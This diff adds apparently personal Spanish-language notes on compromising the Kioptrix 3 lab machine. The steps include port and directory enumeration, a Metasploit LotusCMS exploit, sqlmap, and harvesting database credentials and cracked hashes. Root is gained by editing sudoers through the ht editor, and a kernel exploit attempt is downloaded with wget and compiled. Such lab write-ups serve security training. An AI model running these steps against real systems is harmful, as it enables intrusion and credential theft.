@@ -1,0 +1,132 @@
+###################################################################################################################################################################################################################
+1) Enumeration
+
+// SO version
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+
+// Services
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+
+
+// Web Server CMS
+LotusCMS
+!!!!!
+// Modulo de Metasploit
+https://www.rapid7.com/db/modules/exploit/multi/http/lcms_php_exec
+
+// Fuzzing de directorios
+wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.1.17/FUZZ
+phpmyadmin
+
+//Leer los comentarios del código fuente
+ <!--  <a href="gadmin">Admin</a>&nbsp;&nbsp; -->
+
+###################################################################################################################################################################################################################
+
+2) Explotation
+
+2.1) LotusCMS remote code exploit
+// Lanzo modulo de Mestasploit
+https://www.rapid7.com/db/modules/exploit/multi/http/lcms_php_exe
+set RHOST http://kioptrix3.com
+set URI /gallery/
+run
+
+
+2.2) SQLI
+sqlmap -u "kioptrix3.com/gallery/gallery.php?id=3"
+
+// Busco passwords en sistema
+grep -lr password *
+// Encuentro el siguiente fichero de configuración
+cat gconfig.php
+
+	$GLOBALS["gallarific_mysql_server"] = "localhost";
+	$GLOBALS["gallarific_mysql_database"] = "gallery";
+	$GLOBALS["gallarific_mysql_username"] = "root";
+	$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
+
+// Accedo a la DB mysql
+mysql -u root -p
+fuckeyou
+
+// Recolección de información
+// Para sacar los hashes
+hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
+
+mysql> select * from dev_accounts;
+select * from dev_accounts;
++----+------------+----------------------------------+
+| id | username   | password                         |
++----+------------+----------------------------------+
+|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 | 	Mast3r
+|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | 	starwars
++----+------------+----------------------------------+
+
+// Consigo otro usuario de una parte de la web diferente
+select * from gallarific_users;
++--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+
+| userid | username | password | usertype  | firstname | lastname | email | datejoined | website | issuperuser | photo | joincode |
++--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+
+|      1 | admin    | n0t7t1k4 | superuser | Super     | User     |       | 1302628616 |         |           1 |       |          | 
++--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+
+
+localhost | root             | *47FB3B1E573D80F44CD198DC65DE7764795F948E
+Kioptrix3 | root             | *47FB3B1E573D80F44CD198DC65DE7764795F948E
+127.0.0.1 | root             | *47FB3B1E573D80F44CD198DC65DE7764795F948E
+localhost | debian-sys-maint | *F46D660C8ED1B312A40E366A86D958C6F1EF2AB8exit
+
+
+
+// Accedo usando el protocolo ssh al servidor usando el usuario loneferret
+ssh loneferret@192.168.1.14
+starwars
+
+// El usuario loneferret pertenece a sudoers para ciertas aplicaciones
+loneferret@Kioptrix3:/root$ sudo -l
+User loneferret may run the following commands on this host:
+    (root) NOPASSWD: !/usr/bin/su
+    (root) NOPASSWD: /usr/local/bin/ht
+    
+// Arrreglo un problema del terminal
+ln -s x /usr/share/terminfo/78
+export TERM=xterm-color
+
+// Este usuario tiene permisos para ejecutar un editor de texto llamado ht
+sudo ht
+// Abro /etc/shadow y consigo el hash del password del usuario root
+1$QAKvVJey$6rRkAMGKq1u62yfDaenUr1
+
+// Abro /etc/sudoers
+// Y lo modifico para que el usuario dreg pueda usar sudo sin pass para todo
+# User privilege specification
+root	ALL=(ALL) ALL
+loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht
+dreg ALL=NOPASSWD: ALL
+
+// Ejecuto una shell desde el usuario dreg
+dreg@Kioptrix3:~$ sudo /bin/bash
+root@Kioptrix3:~# whoami
+root
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+/* Intento de elevación de privilegios fallido
+Intentaba usar un exploit para el mismo kernel pero de 64 bits, no es valido para el de 32
+*/
+
+https://www.exploit-db.com/exploits/16982/
+
+uname -r
+2.6.24-24-server
+uname -a
+Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
+wget exploit-db.com/download/9083
+apt-get install libsctp-dev
+gcc -o PrivEsc 9083.c -lsctp
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
